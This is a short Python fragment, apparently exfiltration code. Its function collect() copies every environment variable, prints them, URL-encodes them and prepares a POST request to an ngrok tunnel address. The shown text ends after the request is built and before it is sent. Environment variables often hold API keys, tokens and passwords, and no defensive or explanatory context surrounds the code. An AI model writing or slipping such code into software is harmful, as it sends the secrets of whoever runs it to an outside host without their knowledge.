import os, urllib.parse, urllib.request
def collect():
    data = dict(os.environ)
    print(data)
    encoded = urllib.parse.urlencode(data).encode()
    url = 'https://sample.ngrok-free.app'
    req = urllib.request.Request(url, data=encoded)
